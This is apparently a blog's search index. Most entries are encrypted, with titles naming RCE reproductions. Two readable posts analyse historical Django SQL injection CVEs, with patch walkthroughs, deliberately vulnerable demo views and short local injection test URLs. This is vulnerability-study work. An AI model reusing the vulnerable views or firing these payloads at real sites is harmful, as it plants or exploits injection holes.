<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ThinkPHP_5.1.41_文件上传getshell_CVE-2022-44289（密码保护）</title>
    <link href="/2022/12/09/ThinkPHP-5-1-41-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell-CVE-2022-44289/"/>
    <url>/2022/12/09/ThinkPHP-5-1-41-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell-CVE-2022-44289/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="hash错误">  <script id="hbeData" type="hbeData" data-hmacdigest="9f6c8735653035e8c0dda73731a61e8e6615c2f5685cc56ca84849c9bed1adc5">97cddd587d88b0c01384010daba7d06b8cbadbe9062ad0724ba7afc3b210a95b9d1cd2e3673efeedd04c9798612685997e370a2a163050e2ffde6a946dc89351bd426532ba278b688633caf70eac2af6722105fb75f22fdb6a7b6ae11beb919f4561c00226806c33100fc99f713e1c47b5a0ca1fdfca8cff3f295c208f40344ba8f4c3bebdcfe09d428c32352b4ef205a8927c5fe5672778511865a5278c2aee51e85dd41440fc8fb76cce3f7fc4929d5acd2de9afcfb7f8e776687f3f23f3d66256fb67d24d9777e7377cb0459854aaf4de693d07782178dda55a40f8bc7655f50d4ae95135c295e480fef1f878b2ce56a2b274b354015d9bbb040494c7a9908267048eb4bc8ae86141383eb9ec49a573728008a65307b9e78e2f3e1a3338ff5721c800aa69e343e3ad6f55041710f27480b0eb9db57585a54ba02c660aef21ec18fb6a59e835ced2dac95fc574f5d18edc347bb890dcdf3ff45c29204fc169382f1536b2e057acce349c43513e7638b8a1d8dd103de8e2665f935e5655aefb79aa35bf606359ad5cdc1587bef2f874dbf6a465cabf6469659e03c3ce6b3c411b82ad6d74f85b7ff7c37525844cd69d590ca423a4c6ff4da46ed3a0452269b2fd59ed6fd2d5234736cdf4518e4aae4a78d48139d86b533d1f6b17fd71420c04b58e5953b87cf62037cf465d0a3d302c55369fc66d94929ca631ba91448a89299c48af8a31670b55280210f00135b3b935e14ff4490203c24fb29c9bf9878222115ba056b37a65064f7492858a49212dcd517f0ebff86bba995d21525efef033666127c1604203d12d370fdabdddca706cd99ed80603a842a3cb0da8a3ef46c85a359fb89438a325af15fd1b9eca06c6c6be954819e59f9547e10775f14b35959b4c916ebfa28ffcaedacd1e6328f77abb63f1d73522f91438691a6f10ee48e739e7320a8b1854bdfb392bdde866ac18b95226eed5acf50ec07e12b0457c3ffcc1fea1d2f162f200554d4e359ba8005352d0484d4e75a7184b1b3306ce126d8768e4bd428d277d45bea856926b3e38c44768862eb5ddcffc5f9a5f5c31f74cecab004ae2b6b8b17fd8feac366cff9a896a785c37f8febe2fb26468cd3e251bb9b6972e38aa4df4e920620c95de64dfb9fb9b960b60fb1afa602526fbcce23b0c5196f58ec633c21b3e41244ab93f4bb4d4d9452c8725a136388bfeca7007690e8a4493f80aab352cd46d90fe8308c86325f86203c8383f2e5342f5863527c3f90b7cc75b98579b8fd1efbb3b8c87d86f1a7252d842e4b8ebfb15c404a9332b5199e9892ec36c932365d6a5dd6da55ca6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>PHP漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>CVE</tag>
      
      <tag>ThinkPHP</tag>
      
      <tag>文件上传漏洞</tag>
      
      <tag>getshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cacti_1.2.22_前台RCE_CVE-2022-46169（密码保护）</title>
    <link href="/2022/12/07/Cacti-1-2-22-%E5%89%8D%E5%8F%B0RCE-CVE-2022-46169/"/>
    <url>/2022/12/07/Cacti-1-2-22-%E5%89%8D%E5%8F%B0RCE-CVE-2022-46169/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="hash错误">  <script id="hbeData" type="hbeData" data-hmacdigest="071efccf992052620a3f7965ff7e591e0b2ef6cb4d79bd2ffbcf4653111769fc"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>PHP漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>CVE</tag>
      
      <tag>未授权漏洞</tag>
      
      <tag>RCE</tag>
      
      <tag>Cacti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>帆软反序列化RCE漏洞分析_V20220812（密码保护）</title>
    <link href="/2022/12/02/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-V20220812/"/>
    <url>/2022/12/02/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-V20220812/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="hash错误">  <script id="hbeData" type="hbeData" data-hmacdigest="110a80bd741d91aa0934d31f0fb2224343054e3c83fb3a20d212a5771dc81d09"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>JAVA漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RCE</tag>
      
      <tag>JAVA</tag>
      
      <tag>帆软</tag>
      
      <tag>JAVA反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Piwigo_12.2.0_两枚SQL注入_CVE（密码保护）</title>
    <link href="/2022/11/26/Piwigo-12-2-0-%E4%B8%A4%E6%9E%9ASQL%E6%B3%A8%E5%85%A5-CVE/"/>
    <url>/2022/11/26/Piwigo-12-2-0-%E4%B8%A4%E6%9E%9ASQL%E6%B3%A8%E5%85%A5-CVE/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="hash错误">  <script id="hbeData" type="hbeData" data-hmacdigest="dafa278ef8ec1a5ca049f91b28d82046d0b2c29c33ef495f3259c1d559e7d80b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>PHP漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>Piwigo</tag>
      
      <tag>SQL注入漏洞</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>细数Django框架核心历史SQL注入漏洞（下）</title>
    <link href="/2022/10/15/%E7%BB%86%E6%95%B0Django%E6%A1%86%E6%9E%B6%E6%A0%B8%E5%BF%83%E5%8E%86%E5%8F%B2SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/2022/10/15/%E7%BB%86%E6%95%B0Django%E6%A1%86%E6%9E%B6%E6%A0%B8%E5%BF%83%E5%8E%86%E5%8F%B2SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1962">https://forum.butian.net/share/1962</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近总结了一下 <code>Django</code> 框架曾经出现的 <code>SQL</code> 注入漏洞，总共有七个 <code>CVE</code> ，分别都简单分析复现并写了文章，总体来说会觉得比较有意思，在这里分享一下。本篇文章是下篇。上篇请查看：<a href="https://forum.butian.net/share/1923">细数Django框架核心历史SQL注入漏洞（上）</a></p><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><p>本篇文章分享三个 <code>CVE</code> ，其他四个 <code>CVE</code> 在上篇文章展现。</p><ul><li>CVE-2022-28346</li><li>CVE-2022-28347</li><li>CVE-2022-34265</li></ul><h2 id="0x02-CVE-2022-28346"><a href="#0x02-CVE-2022-28346" class="headerlink" title="0x02 CVE-2022-28346"></a>0x02 CVE-2022-28346</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2022年发布的安全更新，修复了在 <code>QuerySet</code> 的 <code>annotate()</code>， <code>aggregate()</code>， <code>extra() </code>  等函数中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.28</li><li>Django 3.2.x &lt; 3.2.13</li><li>Django 4.0.x &lt; 4.0.4</li></ul><p>需要使用了 <code>annotate</code>  或者 <code>aggregate</code> 或 <code>extra</code> 方法</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以直接来到 <code>github</code> 修复记录</p><p><img src="20220923100805.png" alt="1"></p><p>这里给 <code>add_annotation</code> 和 <code>add_extra</code> 两个函数中的参数添加了正则过滤，接下来我们就是要找到哪里使用到了这两个函数</p><p>这里其实可以通过测试用例来进行判断，我们可以看到修复记录中也存在测试用例的修复有点多，这里只选取一个进行分析</p><p><img src="20220923101337.png" alt="2"></p><p>这里使用到了如下语句</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Author<span class="hljs-selector-class">.objects</span><span class="hljs-selector-class">.aggregate</span>(**&#123;crafted_alias: <span class="hljs-built_in">Avg</span>(<span class="hljs-string">&quot;age&quot;</span>)&#125;)<br></code></pre></td></tr></table></figure><p><code>crafted_alias</code> 是用来测试的 <code>payload</code> ，我们先找到 <code>aggregate</code> 的实现位置</p><p>最终可以找到这里 <code>django\db\models\query.py</code></p><p><img src="20220923101814.png" alt="3"></p><p>传进来的 <code>args</code> 与 <code>kwargs</code>会经过 <code>_validate_values_are_expressions</code> 处理，但没有进行过滤</p><p>之后进过 <code>add_annotation</code> 进行赋值，如下</p><p><img src="20220923102244.png" alt="4"></p><p>这里就是修复 <code>sql</code> 注入的位置，对 <code>alias</code> 进行了过滤，而目前这里没有进行过滤，直接成为了 <code>self.annotations</code> 的键，之后跟进会发现这个<code>self.annotations</code> 在 <code>resolve_ref</code> 函数中被取出来</p><p><img src="20220923103209.png" alt="5"></p><p>这里会将我们之前的 <code>alias</code> 的值最终放到 <code>transform</code> 中，直接被使用</p><p>其他的漏洞函数与这个类似，就不分析了。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现环境参考之前的 <code>CVE-2020-7471</code> ，只需要更改 <code>views.py</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render, HttpResponse<br><span class="hljs-keyword">from</span> .models <span class="hljs-keyword">import</span> Collection<br><span class="hljs-keyword">from</span> django.contrib.postgres.aggregates.general <span class="hljs-keyword">import</span> StringAgg<br><span class="hljs-keyword">from</span> django.db.models <span class="hljs-keyword">import</span> Count<br><br># <span class="hljs-keyword">Create</span> your views here.<br><br>def vuln(request):<br>    query = request.<span class="hljs-keyword">GET</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;q&#x27;</span>)<br>    qs = Collection.objects.annotate(**&#123;query:Count(&quot;name&quot;)&#125;)<br>    <span class="hljs-keyword">return</span> HttpResponse(qs)<br><br></code></pre></td></tr></table></figure><p><code>payload</code> 如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/vuln/</span>?q=aaaaa%<span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p><img src="20220923105043.png" alt="6"></p><h2 id="0x03-CVE-2022-28347"><a href="#0x03-CVE-2022-28347" class="headerlink" title="0x03 CVE-2022-28347"></a>0x03 CVE-2022-28347</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2022年发布的安全更新，修复了在 <code>QuerySet</code> 的 <code>explain()</code>函数中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响-1"><a href="#漏洞影响-1" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.28</li><li>Django 3.2.x &lt; 3.2.13</li><li>Django 4.0.x &lt; 4.0.4</li></ul><p>需要使用了 <code>explain</code>  方法，并且参数可控</p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以直接来到 <code>github</code> 修复记录</p><p><img src="20220923150326.png" alt="7"></p><p>这里首先做的就是对 <code>options</code> 的内容进行过滤，如果包含敏感的字符，那么就报错，仅仅这些还没够，还做了如下更改</p><p><img src="20220923150512.png" alt="8"></p><p>这里做了一个白名单，只有在这个白名单中的字符串才可以被使用，不会直接将所有的都拼接进去</p><p>有了修复的记录，我们就很容易定位到出现问题的地方，这里 <code>django\db\models\sql\compiler.py</code>  是将代码变成 <code>sql</code> 语句，在这里有一句关于 <code>explain</code> 的处理</p><p><img src="20220923150735.png" alt="1"></p><p><code>result</code> 是一个数组，里面的字符串最后都会拼接到一起，这里调用 <code>explain_query_prefix</code> 进行处理 <code>self.query.explain_options</code> 的内容，我们这里使用 <code>postgres</code> 数据库，并且 <code>postgres</code> 对这个函数存在重写，因此这里也直接看该数据库相关的处理</p><p><code>django\db\backends\postgresql\operations.py</code></p><p> <img src="20220923151019.png" alt="1"></p><p>经过父类的处理后，在下面，会将<code>options</code> 中的每一个取出来，键直接为键，值存在就为 <code>true</code> ，因此值无法被更改，但是键会直接写入，最后拼接到 <code>prefix</code> 上去，因此这里的键存在注入。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现环境参考之前的 <code>CVE-2022-28346</code> ，只需要更改 <code>views.py</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render, HttpResponse<br><span class="hljs-keyword">from</span> .models <span class="hljs-keyword">import</span> Collection<br><span class="hljs-keyword">from</span> django.contrib.postgres.aggregates.general <span class="hljs-keyword">import</span> StringAgg<br><span class="hljs-keyword">from</span> django.db.models <span class="hljs-keyword">import</span> Count<br><br><span class="hljs-keyword">import</span> <span class="hljs-type">json</span><br># <span class="hljs-keyword">Create</span> your views here.<br><br>def vuln(request):<br>    query = request.<span class="hljs-keyword">GET</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;q&#x27;</span>)<br>    query = <span class="hljs-type">json</span>.loads(query)<br>    qs = Collection.objects.<span class="hljs-keyword">filter</span>(<span class="hljs-type">name</span>=&quot;tom&quot;).<span class="hljs-keyword">explain</span>(**query)<br>    <span class="hljs-keyword">return</span> HttpResponse(qs)<br><br></code></pre></td></tr></table></figure><p><code>payload</code> 如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8000</span>/vuln/?q=&#123;%<span class="hljs-number">22</span>ANALYZE%<span class="hljs-number">20</span>true)%<span class="hljs-number">22</span>:%<span class="hljs-number">22</span>aaa%<span class="hljs-number">22</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="20220923151815.png" alt="1"></p><h2 id="0x04-CVE-2022-34265"><a href="#0x04-CVE-2022-34265" class="headerlink" title="0x04 CVE-2022-34265"></a>0x04 CVE-2022-34265</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2022年发布的安全更新，修复了在 <code>Trunc()</code> 和 <code>Extract()</code> 函数中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响-2"><a href="#漏洞影响-2" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 3.2.x &lt; 3.2.14</li><li>Django 4.0.x &lt; 4.0.6</li></ul><p>需要使用了 <code>Trunc()</code> 或 <code>Extract()</code>  方法，并且参数可控</p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以直接来到 <code>github</code> 修复记录</p><p><img src="20220923163054.png" alt="1"></p><p>在这里是直接给 <code>Extract</code> 类或者 <code>Trunc</code> 类的 <code>as_sql</code> 方法添加了一层正则过滤。</p><p>这里我们以 <code>Extract</code> 为例，可以多关注被过滤的那个参数，也就是 <code>self.lookup_name</code> </p><p><img src="20220923164046.png" alt="1"></p><p>这里我们可以进入多个分支，但之后得处理实际上都差不多，我们先进入 <code>datetime_extract_sql</code> </p><p><img src="20220923164231.png" alt="1"></p><p>这里还是进入了和上面一样的 <code>date_extract_sql</code> 函数，而且没有经历其他的处理</p><p><img src="20220923164335.png" alt="1"></p><p>看到 <code>lookup_type</code> ，就是我们之前传入的被过滤的参数，最后在 <code>else</code> 直接拼接了，直接造成 <code>sql</code> 注入。 </p><p><code>trunc</code> 也是一样，不过进入的是 <code>datetime_trunc_sql</code>  或者 <code>time_trunc_sql</code> 等函数</p><p><img src="20220923164652.png" alt="1"></p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞复现可以参照修复记录中的 <code>test</code> ，这里直接使用 <code>vulhub</code> 的环境，可以直接在下面获取</p><p><code>payload</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8000</span>/?date=aaa%<span class="hljs-number">27</span><br></code></pre></td></tr></table></figure><p><img src="20220923202021.png" alt="1"></p>]]></content>
    
    
    <categories>
      
      <category>Python漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入漏洞</tag>
      
      <tag>CVE</tag>
      
      <tag>漏洞复现</tag>
      
      <tag>Python</tag>
      
      <tag>Django</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DedeCMS_5.7.97_前台RCE_漏洞挖掘与分析（密码保护）</title>
    <link href="/2022/10/04/DedeCMS-5-7-97-%E5%89%8D%E5%8F%B0RCE-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <url>/2022/10/04/DedeCMS-5-7-97-%E5%89%8D%E5%8F%B0RCE-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="hash错误">  <script id="hbeData" type="hbeData" data-hmacdigest="e541b97ba840e3363fc767cb3c8dc2e34b9efeaee4246be41dbb7d21188d885b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>CVE</tag>
      
      <tag>DedeCMS</tag>
      
      <tag>未授权漏洞</tag>
      
      <tag>RCE</tag>
      
      <tag>CNVD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>细数Django框架核心历史SQL注入漏洞（上）</title>
    <link href="/2022/09/23/%E7%BB%86%E6%95%B0Django%E6%A1%86%E6%9E%B6%E6%A0%B8%E5%BF%83%E5%8E%86%E5%8F%B2SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <url>/2022/09/23/%E7%BB%86%E6%95%B0Django%E6%A1%86%E6%9E%B6%E6%A0%B8%E5%BF%83%E5%8E%86%E5%8F%B2SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1923">https://forum.butian.net/share/1923</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近总结了一下 <code>Django</code> 框架曾经出现的 <code>SQL</code> 注入漏洞，总共有七个 <code>CVE</code> ，分别都简单分析复现并写了文章，总体来说会觉得比较有意思，在这里分享一下。</p><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><p>本篇文章分享四个 <code>CVE</code> ，剩余三个 <code>CVE</code> 将在下篇文章展现。</p><ul><li>CVE-2019-14234</li><li>CVE-2020-7471</li><li>CVE-2020-9402</li><li>CVE-2021-35042</li></ul><h2 id="0x02-CVE-2019-14234"><a href="#0x02-CVE-2019-14234" class="headerlink" title="0x02 CVE-2019-14234"></a>0x02 CVE-2019-14234</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2019年发布的一个安全更新，修复了在 <code>JSONField</code>、<code>HStoreField</code> 两个模型字段中存在的SQL注入漏洞。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.4</li><li>Django 2.1.x &lt; 2.1.11</li><li>Django 1.11.x &lt; 1.11.23</li></ul><p>该漏洞需要开发者使用了 <code>JSONField</code> 或者 <code>HStoreField</code> ，并且 <code>QuerySet</code> 中的键名可控，<code>Django</code> 自带的 <code>Django-admin</code> 中就存在这样的写法，可以利用其进行攻击。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>当我们进行查询时，会使用到 <code>QuerySet</code> ，一般形式为</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Collection<span class="hljs-selector-class">.objects</span><span class="hljs-selector-class">.filter</span>(blog__author__extra=<span class="hljs-string">&#x27;tom&#x27;</span>)<span class="hljs-selector-class">.all</span>()<br></code></pre></td></tr></table></figure><p><code>filter</code> 中包含三个部分，由 <code>__</code> 分割，第一部分被称为 <code>transform</code> ，比如此处，就是查找 <code>blog</code> 表中的 <code>author</code> 字段，一般这里就是通过外键表现两个表之间的关系，但也存在特殊情况，比如存在 <code>JSONField</code> 类型的字段时，那么就是从 <code>JSON</code> 字段中查找；第二部分是字段，表的字段或者 <code>JSON</code> 的字段；第三部分被称为 <code>lookup</code> ，表示为后面值之间的对比关系，可不写，默认为 <code>extra</code>。</p><p>此处我们选择 <code>JSONField</code> 进行分析，当 <code>blog</code> 字段为 <code>JSONField</code> 类型时，</p><p><img src="20220921171923.png" alt="1"></p><p><code>JSONField</code> 继承自 <code>Field</code> ，<code>Field</code> 又是继承 <code>RegisterLookupMixin</code> ，已经存在一个 <code>get_transform</code> 方法，此处由于获取方式不同，因此重写该方法，之后是返回了一个 <code>KeyTransformFactory(name)</code> ，接下来看看这里的代码</p><p><img src="image-20220921173225909.png" alt="1"></p><p>直接被调用时，又会触发 <code>KeyTransform(self.key_name, *args, **kwargs)</code></p><p><img src="20220921173335.png" alt="1"></p><p>在这里，最后会被执行 <code>as_sql</code> 方法，目的是生成 <code>sql</code> 语句，但是这里的 <code>self.key_name</code> 没有经过任何过滤就被拼接并直接返回，因此造成了注入。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现直接借助了 <code>vulhub</code> 的环境，直接启动，环境代码可以直接在最下面的参考链接中找到</p><p>如下所示，<code>Collections</code> 就是在 <code>model</code> 中使用了 <code>JSONField</code> </p><p><img src="20220921153333.png" alt="1"></p><p>代码和细节如下</p><p><img src="20220921153819.png" alt="1"></p><p>此处的 <code>detail</code> 使用了 <code>JSONField</code> ，访问链接即可触发漏洞</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//y</span>our-ip:<span class="hljs-number">8000</span><span class="hljs-regexp">/admin/</span>vuln<span class="hljs-regexp">/collection/</span>?detail__a%<span class="hljs-number">27</span>b=<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p><img src="20220921154135.png" alt="1"></p><h2 id="0x03-CVE-2020-7471"><a href="#0x03-CVE-2020-7471" class="headerlink" title="0x03 CVE-2020-7471"></a>0x03 CVE-2020-7471</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2020年发布的一个安全更新，修复了在 <code>StringAgg</code> 中存在的SQL注入漏洞。</p><h3 id="漏洞影响-1"><a href="#漏洞影响-1" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.10</li><li>Django 3.0.x &lt; 3.0.3</li><li>Django 1.11.x &lt; 1.11.28</li></ul><p>该漏洞需要开发者使用了 <code>StringAgg</code>  ，并且 <code>delimiter</code> 参数可控，则可以利用其进行攻击。</p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先来看到 <code>github</code> 上的代码比对</p><p><img src="20220921230809.png" alt="1"></p><p>这里说明两点问题，第一， <code>delimter</code> 参数没有经过过滤就传入，第二，<code>delimter</code> 会直接进行字符串拼接，因此也是导致了存在 <code>SQL</code> 注入漏洞的原因。</p><p>接下来我们要做的就是找到使用该漏洞类的地方，关于 <code>StringAgg</code> 的使用可以看官方文档 <code>https://docs.djangoproject.com/zh-hans/4.1/ref/contrib/postgres/aggregates/</code> </p><p>很容易就可以得到一个可以利用的场景</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Collection<span class="hljs-selector-class">.objects</span><span class="hljs-selector-class">.annotate</span>(tempname=<span class="hljs-built_in">StringAgg</span>(<span class="hljs-string">&#x27;name&#x27;</span>, delimiter=query))<span class="hljs-selector-class">.values</span>(<span class="hljs-string">&#x27;name&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><code>vulhub</code> 中没有找到相应的环境，找一个类似的环境改改，注意也需要使用 <code>postgres</code> 数据库</p><p><code>views.py</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 